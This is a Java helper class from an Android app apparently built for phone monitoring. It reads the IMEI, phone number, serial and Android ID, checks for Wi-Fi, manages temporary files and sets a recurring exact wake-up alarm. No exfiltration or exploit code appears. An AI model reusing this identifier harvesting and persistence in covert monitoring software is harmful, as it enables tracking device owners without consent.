package com.monitor.phone.s0ft.phonemonitor;


import android.Manifest;
import android.annotation.SuppressLint;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Build;
import android.os.SystemClock;
import android.provider.Settings;
import android.support.annotation.RequiresApi;
import android.support.v4.app.ActivityCompat;
import android.telephony.TelephonyManager;
import android.util.Log;

import java.io.File;
import java.io.FileFilter;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.Callable;

import static android.content.Context.ALARM_SERVICE;


public class HelperMethods {

    static MainActivity checkPermissions = new MainActivity();

    static boolean isInternetAvailable(Context context) {
        boolean retval = false;
        try {
            ConnectivityManager connectivityManager = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
            if (connectivityManager != null) {
                NetworkInfo networkInfo = connectivityManager.getActiveNetworkInfo();
                if (networkInfo != null) {
                    if (networkInfo.getTypeName().toLowerCase().equals("wifi")) {
                        if (networkInfo.isConnected())
                            retval = true;
                    }
                }

            }
        } catch (NullPointerException npe) {
            Log.w(AppSettings.getTAG(), "NullPointerException @ HelperMethods.iInternetAvailable");
        }
        return retval;
    }

    static void waitWithTimeout(Callable testCallable, Object breakValue, long timeoutmillisecond) throws Exception {
        long initmillis = System.currentTimeMillis();
        while (System.currentTimeMillis() - initmillis < timeoutmillisecond) {
            if (testCallable.call().equals(breakValue)) break;
        }
    }

    static void waitWithTimeoutN(Callable testCallable, Object continueValue, long timeoutmillisecond) throws Exception {
        long initmillis = System.currentTimeMillis();
        while (System.currentTimeMillis() - initmillis < timeoutmillisecond) {
            if (testCallable.call() != continueValue) break;
        }
    }


    static void renameTmpFile(String filepath) {
        try {
            File file = new File(filepath);
            if (!file.exists()) return;
            String path = file.getAbsolutePath();
            String dirpath = path.substring(0, path.lastIndexOf("/"));
            String filename = file.getName();
            String newpath = dirpath + "/" + filename.substring(0, filename.length() - 4);
            File newFile = new File(newpath);
            file.renameTo(newFile);
        } catch (Exception ex) {
            Log.w(AppSettings.getTAG(), "Exception while renaming file.\n" + ex.getMessage());
        }


    }

    static void removeBrokenTmpFiles(String dirPath) {
        try {
            File dirPath_ = new File(dirPath);
            File[] tmpFiles = dirPath_.listFiles(new FileFilter() {
                @Override
                public boolean accept(File file) {
                    return file.getName().toLowerCase().endsWith(".tmp");
                }
            });
            for (File tmpFile : tmpFiles) {
                tmpFile.delete();
            }
        } catch (Exception ex) {
            Log.w(AppSettings.getTAG(), "Exception while deleting broken tmp files.\n" + ex.getMessage());
        }

    }

    @RequiresApi(api = Build.VERSION_CODES.M)
    static String getIMEI(Context context) {
        String retval = "";
        TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        if (telephonyManager != null) {
            if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
                // TODO: Consider calling
                //    ActivityCompat#requestPermissions
                // here to request the missing permissions, and then overriding
                //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
                //                                          int[] grantResults)
                // to handle the case where the user grants the permission. See the documentation
                // for ActivityCompat#requestPermissions for more details.
                return "false";
            }
            retval = telephonyManager.getDeviceId();

        }
        return retval;
    }

    @SuppressLint("MissingPermission")
    @RequiresApi(api = Build.VERSION_CODES.M)
    static String getNumber(Context context) {
        String retval = "";
        TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        if (telephonyManager != null) {
            retval = telephonyManager.getLine1Number();


        }
        return retval;
    }

    static String getDeviceUID(Context context) {
        String serial = Build.SERIAL;
        String androidId = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
        return serial + androidId;
    }

    static String getDeviceNUID(Context context) {
        TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        String line1phonenumber = "";
        if (telephonyManager != null) {
            try {
                line1phonenumber = telephonyManager.getLine1Number();
            } catch (SecurityException secx) {

            }
        }
        return line1phonenumber + "_" + Build.MANUFACTURER + "_" + Build.MODEL;
    }

    static void createOneTimeExactAlarm(Context context) {
        Intent intent = new Intent(context, AlarmBroadcastReceiver.class);
        PendingIntent pendingIntent = PendingIntent.getBroadcast(context, 10, intent, 0);
        AlarmManager alarmManager = null;
        alarmManager = (AlarmManager) context.getSystemService(ALARM_SERVICE);
        if (alarmManager != null) {
            alarmManager.cancel(pendingIntent);//kill any pre-existing alarms
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)
                alarmManager.setExactAndAllowWhileIdle(AlarmManager.ELAPSED_REALTIME_WAKEUP, SystemClock.elapsedRealtime() + 60000, pendingIntent);
            else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT)
                alarmManager.setExact(AlarmManager.ELAPSED_REALTIME_WAKEUP, SystemClock.elapsedRealtime() + 60000, pendingIntent);
            else
                alarmManager.set(AlarmManager.ELAPSED_REALTIME_WAKEUP, SystemClock.elapsedRealtime() + 60000, pendingIntent);
        }
    }

    static List<Thread> getThreadsByName(String threadName) {
        List<Thread> retval = new ArrayList<>();
        for (Thread thread : Thread.getAllStackTraces().keySet()) {
            if (thread.getName().equals(threadName))
                retval.add(thread);
        }
        return retval;
    }

}
